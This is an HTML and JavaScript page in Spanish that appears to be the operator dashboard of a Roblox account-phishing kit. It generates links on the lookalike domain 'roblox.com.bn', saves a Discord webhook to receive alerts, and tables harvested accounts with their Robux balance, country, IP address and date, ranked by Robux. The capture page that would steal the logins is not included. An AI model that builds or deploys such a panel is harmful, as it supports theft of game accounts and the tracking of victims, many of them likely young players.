<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Novadynamics — Panel</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
        :root{--fondo:#121214;--fondo2:#1B1B1F;--fondo3:#27272B;--acento:#E63946;--texto:#F1F5F9;--texto2:#94A3B8;--borde:#333338;--dorado:#F59E0B}
        body{background:var(--fondo);color:var(--texto);display:flex;min-height:100vh}
        .sidebar{width:190px;background:var(--fondo2);border-right:1px solid var(--borde);padding:16px 10px;position:fixed;height:100vh}
        .logo{font-size:18px;font-weight:700;padding:10px 12px 16px;border-bottom:1px solid var(--borde);margin-bottom:10px}
        .logo span{color:var(--acento)}
        .btn{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:8px;color:var(--texto2);border:none;background:transparent;cursor:pointer;font-size:14px;text-align:left;width:100%;margin-bottom:4px;transition:all .2s}
        .btn:hover{background:var(--fondo3);color:var(--texto)}
        .btn.activo{background:linear-gradient(90deg,#C22E3B,var(--acento));color:#fff}
        .main{margin-left:190px;flex:1;padding:20px}
        .pagina{display:none}
        .pagina.activa{display:block}
        .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:24px}
        .card{background:var(--fondo2);border:1px solid var(--borde);border-radius:10px;padding:18px}
        .card.roja{background:linear-gradient(135deg,#C22E3B,var(--acento));color:#fff;border-color:transparent}
        .etq{font-size:13px;opacity:.85;margin-bottom:6px}
        .valor{font-size:30px;font-weight:700}
        .panel{background:var(--fondo2);border:1px solid var(--borde);border-radius:10px;padding:18px;margin-bottom:16px}
        .panel h3{font-size:15px;margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid var(--borde)}
        .tabs{display:flex;gap:6px;border-bottom:1px solid var(--borde);margin-bottom:16px}
        .tab{padding:10px 16px;font-size:14px;cursor:pointer;border-bottom:2px solid transparent;color:var(--texto2)}
        .tab.activa{border-bottom-color:var(--acento);color:var(--acento);font-weight:500}
        .tab-cont{display:none}
        .tab-cont.activo{display:block}
        input{width:100%;padding:10px 14px;background:var(--fondo3);border:1px solid var(--borde);border-radius:8px;margin-bottom:10px;font-size:14px;color:var(--texto);outline:none}
        input:focus{border-color:var(--acento)}
        button{background:var(--acento);color:#fff;border:none;border-radius:8px;padding:10px 18px;font-size:14px;cursor:pointer}
        button.sec{background:var(--fondo3);color:var(--texto);border:1px solid var(--borde)}
        .fila-sw{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid var(--borde);font-size:14px}
        .sw{width:46px;height:24px;background:var(--fondo3);border-radius:12px;position:relative;cursor:pointer;transition:.25s;border:1px solid var(--borde)}
        .sw.activo{background:var(--acento);border-color:transparent}
        .sw::after{content:'';position:absolute;width:18px;height:18px;background:#fff;border-radius:50%;top:2px;left:3px;transition:.25s}
        .sw.activo::after{transform:translateX(20px)}
        .estado{font-size:13px;margin:10px 0 14px}
        .ok{color:#22C55E}
        .alerta{color:var(--acento)}
        .caja-link{padding:12px;background:var(--fondo3);border:1px solid var(--borde);border-radius:8px;word-break:break-all;font-size:13px;margin:12px 0;display:none}
        .fila{display:flex;justify-content:space-between;align-items:center;padding:10px 8px;border-bottom:1px solid var(--borde);font-size:14px}
        .fila:hover{background:var(--fondo3)}
        .fila:last-child{border:none}
        .pos{font-weight:700;color:var(--acento);width:32px}
        .robux{font-weight:600;color:var(--dorado)}
        table{width:100%;border-collapse:collapse;font-size:13px}
        th{background:var(--fondo3);color:var(--texto);padding:10px 8px;text-align:left;border-bottom:2px solid var(--borde)}
        td{padding:10px 8px;border-bottom:1px solid var(--borde);color:var(--texto2)}
        .vacio{text-align:center;padding:40px;color:var(--texto2)}
    </style>
</head>
<body>

<aside class="sidebar">
    <div class="logo"><span>N</span>ovadynamics</div>
    <nav>
        <button class="btn activo" onclick="irPag('inicio')">🏠 Inicio</button>
        <button class="btn" onclick="irPag('enlaces')">🔗 Generar Enlace</button>
        <button class="btn" onclick="irPag('cuentas')">📋 Historial</button>
    </nav>
</aside>

<main class="main">
    <div class="pagina activa" id="pagInicio">
        <h2 style="margin-bottom:20px;font-size:18px">Panel de Control</h2>
        <div class="grid">
            <div class="card roja"><div class="etq">Robux Acumulados</div><div class="valor" id="robuxSum">0</div></div>
            <div class="card"><div class="etq">Total Robux</div><div class="valor" id="robuxTot">0</div></div>
            <div class="card"><div class="etq">Cuentas Registradas</div><div class="valor" id="cuentasTot">0</div></div>
        </div>
        <div class="panel">
            <h3>🏆 Ranking de Cuentas</h3>
            <div id="listaRank"><div class="vacio">Sin registros aún</div></div>
        </div>
    </div>

    <div class="pagina" id="pagEnlaces">
        <h2 style="margin-bottom:20px;font-size:18px">Generador de Enlaces</h2>
        <div class="tabs">
            <span class="tab activa" onclick="irTab('crear')">🔗 Crear Enlace</span>
            <span class="tab" onclick="irTab('config')">⚙️ Configuración</span>
        </div>
        <div class="tab-cont activo" id="tabCrear">
            <div class="panel">
                <h3>Enlace Personalizado</h3>
                <input type="text" id="datoUsuario" placeholder="Nombre de usuario o ID">
                <button onclick="crearEnlace()">Generar Enlace</button>
                <div class="caja-link" id="enlaceGenerado"></div>
                <button class="sec" style="display:none;margin-top:8px" id="botonCopiar" onclick="copiarEnlace()">📋 Copiar Enlace</button>
            </div>
        </div>
        <div class="tab-cont" id="tabConfig">
            <div class="panel">
                <h3>Configuración del Sistema</h3>
                <input type="text" id="urlWebhook" placeholder="Webhook de Discord">
                <button onclick="guardarWebhook()">✅ Guardar</button>
                <button class="sec" onclick="borrarWebhook()">🗑️ Borrar</button>
                <div class="estado alerta" id="estadoWebhook">⚠️ Sin configurar</div>
                <div class="fila-sw">
                    <span>🔔 Activar @everyone</span>
                    <div class="sw" id="botonTodos" onclick="cambiarTodos()"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="pagina" id="pagCuentas">
        <h2 style="margin-bottom:20px;font-size:18px">Historial de Registros</h2>
        <div class="panel">
            <table>
                <thead><tr><th>Usuario</th><th>Robux</th><th>País</th><th>IP</th><th>Fecha</th></tr></thead>
                <tbody id="cuerpoTabla"><tr><td colspan="5" class="vacio">Sin registros aún</td></tr></tbody>
            </table>
        </div>
    </div>
</main>

<script>
let registros = JSON.parse(localStorage.getItem('registros')||'[]'), enlaceActual='';
function irPag(n){document.querySelectorAll('.pagina').forEach(p=>p.classList.remove('activa'));document.getElementById('pag'+n.charAt(0).toUpperCase()+n.slice(1)).classList.add('activa');document.querySelectorAll('.btn').forEach(b=>b.classList.remove('activo'));event.currentTarget.classList.add('activo');actualizarTodo()}
function irTab(n){document.querySelectorAll('.tab').forEach(t=>t.classList.remove('activa'));event.currentTarget.classList.add('activa');document.querySelectorAll('.tab-cont').forEach(c=>c.classList.remove('activo'));document.getElementById('tab'+n.charAt(0).toUpperCase()+n.slice(1)).classList.add('activo')}
function guardarWebhook(){const u=document.getElementById('urlWebhook').value.trim(),e=document.getElementById('estadoWebhook');if(!u||!u.startsWith('https://discord.com/api/webhooks/')){e.textContent='❌ Inválido';e.className='estado alerta';return}localStorage.setItem('webhook',u);e.textContent='✅ Guardado y Activo';e.className='estado ok';alert('✅ Webhook guardado')}
function borrarWebhook(){localStorage.removeItem('webhook');document.getElementById('urlWebhook').value='';document.getElementById('estadoWebhook').textContent='⚠️ Sin configurar';document.getElementById('estadoWebhook').className='estado alerta'}
function cambiarTodos(){const s=document.getElementById('botonTodos');s.classList.toggle('activo');localStorage.setItem('notificarTodos',s.classList.contains('activo')?'1':'0')}
function crearEnlace(){const id=document.getElementById('datoUsuario').value.trim()||'usuario';enlaceActual='https://roblox.com.bn/'+id;document.getElementById('enlaceGenerado').style.display='block';document.getElementById('enlaceGenerado').textContent=enlaceActual;document.getElementById('botonCopiar').style.display='block'}
function copiarEnlace(){navigator.clipboard.writeText(enlaceActual).then(()=>alert('✅ Copiado: '+enlaceActual))}
function actualizarTodo(){let t=0;registros.forEach(r=>t+=Number(r.robux||0));document.getElementById('robuxSum').textContent=t;document.getElementById('robuxTot').textContent=t;document.getElementById('cuentasTot').textContent=registros.length;const o=[...registros].sort((a,b)=>Number(b.robux||0)-Number(a.robux||0));document.getElementById('listaRank').innerHTML=o.length?o.map((r,i)=>`<div class="fila"><span class="pos">${i+1}º</span><span>${r.usuario||'---'}</span><span class="robux">${r.robux||0} ₪</span></div>`).join(''):'<div class="vacio">Sin registros aún</div>';document.getElementById('cuerpoTabla').innerHTML=registros.length?registros.map(r=>`<tr><td>${r.usuario||'---'}</td><td>${r.robux||0}</td><td>${r.pais||'---'}</td><td>${r.ip||'---'}</td><td>${r.fecha||'---'}</td></tr>`).join(''):'<tr><td colspan="5" class="vacio">Sin registros aún</td></tr>'}
document.addEventListener('DOMContentLoaded',()=>{const w=localStorage.getItem('webhook');if(w){document.getElementById('urlWebhook').value=w;document.getElementById('estadoWebhook').textContent='✅ Guardado y Activo';document.getElementById('estadoWebhook').className='estado ok'}if(localStorage.getItem('notificarTodos')==='1')document.getElementById('botonTodos').classList.add('activo');actualizarTodo()})
</script>
</body>
</html>
